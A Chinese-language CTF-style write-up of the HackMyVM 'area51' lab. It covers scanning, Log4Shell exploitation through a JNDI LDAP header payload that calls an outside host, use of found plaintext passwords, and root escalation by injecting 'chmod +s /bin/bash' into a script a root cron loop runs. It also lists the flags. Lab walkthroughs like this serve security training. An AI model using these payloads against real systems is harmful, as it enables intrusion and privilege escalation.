---
title: area51
tags:
  - sec
date: 2024-04-16T19:27:27
lastmod: 2025-09-29T20:51:48
toc: "true"
---

## 主机发现
```bash
~/workspace sudo arp-scan -I ens33 -l
Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.89.13   08:00:27:96:66:e2       PCS Systemtechnik GmbH
192.168.89.99   f6:39:4a:3d:95:18       (Unknown: locally administered)
192.168.89.247  ca:a7:78:4d:50:e1       (Unknown: locally administered)
```


## 端口扫描
```bash
~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate=10000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 07:34 EDT
Nmap scan report for 192.168.89.13
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 de:bf:2a:93:86:b8:b3:a3:13:5b:46:66:34:d6:dc:b1 (RSA)
|   256 a9:df:bb:71:90:6c:d1:2f:e7:48:97:2e:ad:7b:15:d3 (ECDSA)
|_  256 78:75:83:1c:03:03:a1:92:4f:73:8e:f2:2d:23:d2:0e (ED25519)
80/tcp   open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: FBI Access
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (application/json).
MAC Address: 08:00:27:96:66:E2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.52 ms 192.168.89.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
```

## web_80

```bash
~/workspace whatweb 192.168.89.13
http://192.168.89.13 [200 OK] Apache[2.4.51], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[192.168.89.13], JQuery[2.1.3], PasswordField, Script, Title[FBI Access]
~/workspace whatweb 192.168.89.13:8080
http://192.168.89.13:8080 [400 Bad Request] Country[RESERVED][ZZ], IP[192.168.89.13]
```

![HMV_area51_image_1](https://img.l1uyun.one/HMV_area51_image_1.png)

进去是个登录窗口, 随便输入个凭据, 点击登录. 没有数据包发出去
![HMV_area51_image_2](https://img.l1uyun.one/HMV_area51_image_2.png)
就是个js
```bash
var working = false;
$('.login').on('submit', function(e) {
  e.preventDefault();
  if (working) return;
  working = true;
  var $this = $(this),
    $state = $this.find('button > .state');
  $this.addClass('loading');
  $state.html('Authenticating');
  setTimeout(function() {
    $this.addClass('ok');
    $state.html('Not authorized. The access attempt will be reported.');
    setTimeout(function() {
      $state.html('Log in');
      $this.removeClass('ok loading');
      working = false;
    }, 4000);
  }, 3000);
});
```

扫一下
```shell
☁  workspace  sudo gobuster dir  -u 'http://192.168.89.13/' -w ./directory-list-2.3-medium.txt -r -t 50  -x txt,js,html,php  2>/dev/null
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.89.13/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                ./directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,js,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1131]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/video                (Status: 200) [Size: 4655]
/script.js            (Status: 200) [Size: 525]
/radar                (Status: 200) [Size: 730]
/note.txt             (Status: 200) [Size: 119]
```


```bash
~/workspace curl 192.168.89.13/note.txt
Alert!
We have a vulnerability in our java application...
Notify the programming department to check Log4J.

-Admin#
~/workspace
```
说有一个java Application的话, 换个端口吧

## web_8080

![HMV_area51_image_3](https://img.l1uyun.one/HMV_area51_image_3.png)

![HMV_area51_image_4](https://img.l1uyun.one/HMV_area51_image_4.png)

继续扫一下
没出来有价值的东西
![HMV_area51_image_5](https://img.l1uyun.one/HMV_area51_image_5.png)


```shell
☁  workspace  nikto -url http://192.168.89.13:8080
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.89.13
+ Target Hostname:    192.168.89.13
+ Target Port:        8080
+ Start Time:         2024-04-16 19:49:52 (GMT8)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /AZDAS9pJ.prf: Uncommon header 'content-disposition' found, with contents: inline;filename=f.txt.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (connect error): Cannot assign requested address
+ Scan terminated: 20 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-04-16 19:50:13 (GMT8) (21 seconds)
-------------------------------------------------------------------------
```

没有别的东西了
## log4j_RCE
去搜一下log4j的漏洞吧
`https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell#log4shell-vulnerability`

amazing, 使用这个请求头去查询, 就能得到不一样的响应
```shell
~/workspace curl 192.168.89.13:8080 -H 'X-Api-Version:11 '

Hello, world!#

```
使用discovery的payload没成功外带
![HMV_area51_image_6](https://img.l1uyun.one/HMV_area51_image_6.png)

![HMV_area51_image_7](https://img.l1uyun.one/HMV_area51_image_7.png)

选择使用这个工具
https://github.com/kozmer/log4j-shell-poc

需要注册个jdk Oracle 官网的账号, 好困, 下次再打


amazing
![HMV_area51_image_8](https://img.l1uyun.one/HMV_area51_image_8.png)

## docker环境

进去之后是docker环境. 需要逃逸一下
![HMV_area51_image_9](https://img.l1uyun.one/HMV_area51_image_9.png)
```bash
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```




接触到了一个新的工具, fscan, 常见的内网扫描工具

```bash
./fscan -h 172.17.0.2/16

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 172.17.0.2      is alive
(icmp) Target 172.17.0.1      is alive
[*] LiveTop 172.17.0.0/16    段存活数量为: 2
[*] LiveTop 172.17.0.0/24    段存活数量为: 2
[*] Icmp alive hosts len is: 2
172.17.0.1:8080 open
172.17.0.2:8080 open
172.17.0.1:80 open
[*] alive ports len is: 4
start vulscan
172.17.0.1:22 open
[*] WebTitle http://172.17.0.1         code:200 len:1131   title:FBI Access
[*] WebTitle http://172.17.0.1:8080    code:400 len:277    title:None
[*] WebTitle http://172.17.0.2:8080    code:400 len:277    title:None
```

```bash
curl http://172.17.0.1:8080 -H 'X-Api Version:${jndi:ldap://192.168.68.99:1389/a}'
```
好吧, 这样子好像不行, 之后回过来想想

## 枚举
```bash
cd /var/tmp
ls -al
total 16
drwxrwxrwt    1 root     root          4096 Dec 19  2021 .
drwxr-xr-x    1 root     root          4096 Dec 20  2018 ..
-rw-r--r--    1 root     root            10 Dec 19  2021 .roger
cat .roger
b3st4l13n
```

## ssh登录靶机
```bash
roger@area51:~$ ls -al
total 36
drwxr-xr-x 3 roger roger 4096 Dec 21  2021 .
drwxr-xr-x 3 root  root  4096 Dec 19  2021 ..
lrwxrwxrwx 1 roger roger    9 Dec 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 roger roger  220 Dec 19  2021 .bash_logout
-rw-r--r-- 1 roger roger 3644 Dec 19  2021 .bashrc
drwxr-xr-x 3 roger roger 4096 Dec 19  2021 .local
-rw-r--r-- 1 roger roger  807 Dec 19  2021 .profile
-rw-r--r-- 1 roger roger   69 Dec 21  2021 shoppingList
-rw-r--r-- 1 roger roger  373 Dec 21  2021 SubjectDescription
-rw-r--r-- 1 root  root  1497 Dec 21  2021 user.txt
roger@area51:~$ cat user.txt
                          `--:::::::-.`
                      .://:----------://:`
                   `:/:.-----------------+/`
                  //-.--------------------:o-
                `+-.-----------------------:o:
               `o-.------------------------:/s.
               +-.-------------------------://o
              .+.--------------------------///s`
              +-.------------------------:////o.
              s.----------------------:://///:s`
             `o.------------------/:+/o+/////++
             `o.------------------s/+/+/////+/`
            .:o--------------::::/+//////++/.
           -o+..:/:------------/////////:.`
           /s:.` `+:---://:--//++/+/:.`
           `oys:::/s--/o:.````o+o:.
            `/oo+:++--s/:::/+o++`
              `//:----:++++++/:`
               .+.-------:o+`
                o.-------/s`
                o.------:o-
                o.------+/
             `.:/.--:/:+o
             /o//oydNMm+:
              ```hMMNMNo-
               :/ydysso/
               -s/---/o`
               -++:--//++`
             `+:--------:o.

  FLAG = [ee11cbb19052e40b07aac0ca060c23ee]
roger@area51:~$
```

## 枚举
```bash
roger@area51:/opt$ find / -type f -name ".*" 2>/dev/null | grep -v  sys
/etc/skel/.bash_logout
/etc/skel/.profile
/etc/skel/.bashrc
/etc/cron.weekly/.placeholder
/etc/.pwd.lock
/etc/cron.daily/.placeholder
/etc/.hostname.swp
/etc/cron.d/.placeholder
/etc/cron.hourly/.placeholder
/etc/cron.monthly/.placeholder
/run/network/.ifstate.lock
/usr/share/dictionaries-common/site-elisp/.nosearch
/home/roger/.bash_logout
/home/roger/.profile
/home/roger/.bashrc
roger@area51:/opt$
```


```bash
roger@area51:/etc/skel$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
roger:x:1001:1001:,,,:/home/roger:/bin/bash
kang:x:1000:1000:,,,:/kang:/bin/bash
roger@area51:/etc/skel$ find / -type f -name "kang" 2>/dev/null
/etc/pam.d/kang
roger@area51:/etc/skel$ cat /etc/pam.d/kang
k4ng1sd4b3st
roger@area51:/etc/skel$
```

## 横向移动
```bash
kang@area51:~$ ls -al
total 16
drwxrwx---  3 kang kang 4096 Apr 19 22:56 .
drwxr-xr-x 19 root root 4096 Dec 19  2021 ..
lrwxrwxrwx  1 root root    9 Dec 19  2021 .bash_history -> /dev/null
drwxr-xr-x  3 kang kang 4096 Dec 21  2021 .local
-rw-r--r--  1 root root    8 Apr 19 22:56 weComeInPeace.sh
kang@area51:~$
```

weComeInPeace. sh这个文件有时出现有时没有........... 这肯定是key

## 利用定时任务提权
上pspy试试,有个script. sh
```bash
2024/04/19 22:58:18 CMD: UID=0     PID=1      | /sbin/init
2024/04/19 22:58:18 CMD: UID=0     PID=7132   | /bin/sh /root/script.sh
2024/04/19 22:58:18 CMD: UID=0     PID=7133   | sleep 1
2024/04/19 22:58:19 CMD: UID=0     PID=7134   | /bin/sh /root/script.sh
2024/04/19 22:58:19 CMD: UID=0     PID=7135   | /bin/sh /root/script.sh
2024/04/19 22:58:21 CMD: UID=0     PID=7136   | /bin/sh /root/script.sh
```


使用下面的payload

`for i in {1..10000}; do echo 'chmod +s /bin/bash' >> weComeInPeace.sh; done`


然后就获得了suid的bash
```bash
bash-5.1# ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Aug  4  2021 /bin/bash
```
## root
```bash
bash-5.1# cd /root
bash-5.1# ls -al
total 28
drwx------  3 root root 4096 Dec 21  2021 .
drwxr-xr-x 19 root root 4096 Dec 19  2021 ..
lrwxrwxrwx  1 root root    9 Dec 21  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Dec 19  2021 .local
lrwxrwxrwx  1 root root    9 Dec 21  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root 1561 Dec 21  2021 root.txt
-rwxr-xr-x  1 root root  124 Dec 21  2021 script.sh
-rw-r--r--  1 root root    0 Dec 21  2021 .script.sh.swp
bash-5.1# cat root.txt
                 :
                         /`
                         :-
                        ..-
                        - `-
                   ``...-........``
                `..``-://:-::.`  ``..
               `-`  /////+++++/.    `-
               -    s////:-..-:/`    `.
              ..    +//:`    +-`-`    -
              -   -://+`     +/ `o`   -
              -   :/++//.`   `../+    -
              `.  `+++++///:::/+o:    -
               -   `+++///++////o:    -
               -    .++o+///////+:.   -
               -    .+o+Ns:d-s+///// `.
               `.   :/mhMmhMyM++//-. -
                -   -/mMMMMMMMh+/-   -
                -    +yMMMMMMN+o-`  `.    `....
         .-:-`  ..  `+hMmNNhN/+/:-  -   .//::///
      :::/::+/.  -  .+hNsyd/d-o--: `-  ://.` ```
      `::.  //+  -`  :++-++++++o...-  `++`
            .+/- `-  -+://++///+.-:-  ///
            `+/+``:-///://++///+//y+.-///
             -////sssooooooooosssssoo///-
            `.+//+ooooossoooyssoosss+//:
  `.```-:---///++///+++++++o+oo+++++/+/`
  .//++//////////++////////////++///////-``
       `...`  `.------..-:///////+/:://////-
                            `-:/+++.   ...`


FLAG = [63a9f0ea7bb98050796b649e85481845]
bash-5.1# cat script.sh
#!/bin/sh
while true; do
  rm -rf /kang/*
  sleep 2
  echo "echo hi" > /kang/weComeInPeace.sh
  sh /kang/*
  sleep 1
done


bash-5.1#
```


